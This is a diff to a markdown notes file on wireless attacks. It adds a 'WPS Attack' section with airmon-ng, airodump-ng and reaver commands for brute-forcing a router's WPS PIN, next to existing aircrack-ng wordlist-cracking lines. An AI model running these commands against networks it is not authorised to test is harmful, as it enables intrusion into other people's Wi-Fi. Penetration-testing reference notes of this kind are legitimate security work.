@@ -128,6 +128,15 @@ sudo iwconfig wlan0mon channel 5
 sudo aircrack-ng filename.cap -w dict.lst
 ```
 
+### WPS Attack
+
+``` bash
+airmon-ng start [device]
+airodump-ng [device] --wps
+reaver -i [device] -b [BSSID] -vv
+```
+
+
 ---
 
 #### Reference
